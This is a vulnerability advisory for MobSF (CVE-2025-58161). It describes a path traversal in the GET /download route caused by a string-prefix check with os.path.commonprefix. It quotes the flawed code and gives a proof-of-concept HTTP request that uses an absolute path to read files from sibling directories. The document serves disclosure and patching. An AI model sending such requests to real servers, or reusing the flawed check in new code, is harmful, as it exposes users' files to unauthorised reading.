@@ -1,0 +1,76 @@
+PYSEC-2026-1672 PyPI/mobsf — MobSF Path Traversal in GET /download/<filename> using absolute filenames
+package: mobsf
+ecosystem: PyPI
+versions affected:
+  >= 0, < 4.4.1 (ECOSYSTEM)
+aliases: CVE-2025-58161, GHSA-ccc3-fvfx-mw3v
+references:
+  https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-ccc3-fvfx-mw3v
+  https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/7f3bc086c028c1b50889cab8a15f7b59b7abdaf9
+  https://github.com/MobSF/Mobile-Security-Framework-MobSF
+  https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases/tag/v4.4.1
+  https://pypi.org/project/mobsf
+  https://github.com/advisories/GHSA-ccc3-fvfx-mw3v
+  https://nvd.nist.gov/vuln/detail/CVE-2025-58161
+
+### Summary
+The GET /download/<filename> route uses string path verification via os.path.commonprefix, which allows an authenticated user to download files outside the DWD_DIR download directory from "neighboring" directories whose absolute paths begin with the same prefix as DWD_DIR (e.g., .../downloads_bak, .../downloads.old). This is a Directory Traversal (escape) leading to a data leak.
+
+### Details
+```
+def is_safe_path(safe_root, check_path):
+    safe_root  = os.path.realpath(os.path.normpath(safe_root))
+    check_path = os.path.realpath(os.path.normpath(check_path))
+    return os.path.commonprefix([check_path, safe_root]) == safe_root
+```
+commonprefix compares raw strings, not path components. For:
+```
+safe_root  = /home/mobsf/.MobSF/downloads
+check_path = /home/mobsf/.MobSF/downloads_bak/test.txt
+```
+the function returns True, incorrectly treating downloads_bak as inside downloads.
+Download handler:
+```
+# MobSF/views/home.py
+@login_required
+def download(request):
+    root = settings.DWD_DIR
+    filename = request.path.replace('/download/', '', 1)
+    dwd_file = Path(root) / filename  # absolute 'filename' ignores 'root'
+    if '../' in filename or not is_safe_path(root, dwd_file):
+        return HttpResponseForbidden(...)
+    ext = dwd_file.suffix
+    if ext in settings.ALLOWED_EXTENSIONS and dwd_file.is_file():
+        return file_download(dwd_file, ...)
+```
+If the client supplies an absolute path in filename (starts with / or C:/), Path(root) / filename resolves to that absolute path; the flawed is_safe_path then accepts any sibling directory whose absolute path shares the same string prefix. The ../ check does not catch this.
+
+Which file types are retrievable: Whatever is allowed by settings.ALLOWED_EXTENSIONS
+
+### PoC
+Prereqs: authenticated user; standard install.
+Assume:
+```
+settings.DWD_DIR = /home/mobsf/.MobSF/downloads
+```
+Prepare a sibling directory with the same string prefix and a test file:
+```
+mkdir -p /home/mobsf/.MobSF/downloads_bak
+echo "test" > /home/mobsf/.MobSF/downloads_bak/test.txt
+```
+As an authenticated user, request (note the leading / in the filename and the double/triple slash after /download/ to preserve it):
+```
+GET /download///home/mobsf/.MobSF/downloads_bak/test.txt HTTP/1.1
+Host: <HOST>
+Cookie: sessionid=<YOUR_SESSION>
+```
+Other working sibling directory names (if present):
+```
+…/downloads.old/...
+…/downloads_backup/...
+…/downloads1/...
+…/downloads-archive/...
+…/downloads 2024/... (URL-encoded space: downloads%202024)
+```
+### Impact
+Any authenticated user can download files (with allowed extensions) from sibling directories whose absolute paths start with the same string prefix as DWD_DIR.
